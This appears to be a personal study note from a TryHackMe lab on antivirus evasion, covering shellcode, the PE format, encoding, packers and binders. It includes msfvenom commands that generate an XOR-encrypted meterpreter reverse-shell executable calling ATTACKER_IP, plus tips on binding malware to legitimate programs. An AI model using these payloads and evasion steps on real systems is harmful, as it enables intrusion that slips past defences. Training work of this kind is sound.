# Antivirus Evasion Shellcode

Shellcode is a set of crafted machine code instructions that instruct a vulnerable program to run 
additionally functionality like spawn system shells or reverse shell. Consider visiting the article [[Shellcode]] contains descriptions and further links to various aspects, use case and writing.

[[Windows-Portable-Executable-Format]] is a data structure for file information, organising executable file on a disk; it is important to understand this format for AV as suitable shellcode location, how unpacking and packing occurs and finally that malware analysts and AV analyses this format and its contents to detect malicious code.  

[[Shellcode]] is a set of machine code instructions that executes a payload within the runtime context of vulnerable software to then exploit a machine - see article. To bypass AV we either require a staged or stageless payload.

Encoding or the use of [[Cryptography]] can be used to bypass AV, but modern AV may check for excessive amounts of entropy.  [[Metasploit]] and [[Metasploit-AV-Evasion]]
```bash 
# Find "excellent" encoders 
msfvenom --list encoders | grep excellent
# List encryption formats
msfvenom --list encrypt
# Encrypting meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyKey" -o xored-revshell.exe
```

[[Packers]] transform a program as input so that the functionality is the same but its structure differs:
- Compression to reduce size
- Protect against [[Static-Malware-Analysis]] and [[Reverse-Engineering]] - [[Anti-Reverse-Engineering-Techniques]]

Packers can help evade AV by modifying known signatures in your executable, although packed application can be flagged by AV solutions because of:
- Packed applications contain a stub that can be signatured
- AV that performs In-memory scanning might detect the unpack in-memory code that is malicious to that host. 

[[Binders]] merge executable into a single executable. For AV evasion merging your packed malicious executable with a legitimate executable may help in bypassing AV.

## References

[THM AV Evasion Shellcode Room](https://tryhackme.com/room/avevasionshellcode)